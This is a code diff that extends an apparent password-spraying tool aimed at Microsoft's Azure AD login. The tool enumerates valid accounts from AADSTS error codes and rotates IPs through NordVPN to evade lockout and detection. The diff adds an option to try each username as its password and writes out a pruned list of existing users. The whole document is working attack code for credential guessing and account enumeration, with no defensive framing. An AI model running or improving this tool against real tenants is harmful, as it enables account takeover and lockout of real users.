@@ -1,6 +1,7 @@
 import requests
 import argparse
 import time
+import os
 from nordvpn_switcher import initialize_VPN,rotate_VPN,terminate_VPN
 
 description = """
@@ -28,6 +29,7 @@ parser.add_argument("--url", default="https://login.microsoft.com", help="The UR
 parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
 parser.add_argument("-s", "--sleep", default=0, type=int, help="Sleep this many seconds between tries")
 parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
+parser.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
 
 args = parser.parse_args()
 
@@ -38,6 +40,7 @@ out = args.out
 verbose = args.verbose
 sleep = args.sleep
 vpn = args.vpn
+userAsPass = args.userAsPass
 
 usernames = []
 with open(args.userlist, "r") as userlist:
@@ -53,6 +56,7 @@ results = ""
 username_counter = 0
 lockout_counter = 0
 lockout_question = False
+unknownUsers = []
 
 if vpn:
     initialize_VPN(save=1,area_input=['complete rotation'])
@@ -68,15 +72,26 @@ for username in usernames:
     username_counter += 1
     print(f"{username_counter} of {username_count} users tested", end="\r")
 
-    body = {
+    if userAsPass:
+        body = {
         'resource': 'https://graph.windows.net',
         'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
         'client_info': '1',
         'grant_type': 'password',
         'username': username,
-        'password': password,
+        'password': username.split('@')[0],
         'scope': 'openid',
     }
+    else:
+        body = {
+            'resource': 'https://graph.windows.net',
+            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
+            'client_info': '1',
+            'grant_type': 'password',
+            'username': username,
+            'password': password,
+            'scope': 'openid',
+        }
 
     headers = {
         'Accept': 'application/json',
@@ -95,6 +110,7 @@ for username in usernames:
         if "AADSTS50126" in error:
             if verbose:
                 print(f"VERBOSE: Invalid username or password. Username: {username} could exist.")
+                unknownUsers.append(username)
             continue
 
         elif "AADSTS50128" in error or "AADSTS50059" in error:
@@ -102,6 +118,7 @@ for username in usernames:
 
         elif "AADSTS50034" in error:
             print(f"WARNING! The user {username} doesn't exist.")
+            unknownUsers.append(username)            
 
         elif "AADSTS50079" in error or "AADSTS50076" in error:
             # Microsoft MFA response
@@ -152,9 +169,16 @@ for username in usernames:
         # else: continue even though lockout is detected
 
 if out and results != "":
-    with open(out, 'w') as out_file:
+    with open(out, 'a') as out_file:
         out_file.write(results)
         print(f"Results have been written to {out}.")
 
 if vpn:
     terminate_VPN()
+
+updatedFilename = f"{args.userlist}-Updated"
+print(f"Creating a new file {updatedFilename} by removing users that don't exist")
+with open(updatedFilename, "w") as updatedFile:
+    for username in usernames:
+        if username not in unknownUsers:
+            updatedFile.write(f'{username}\n')
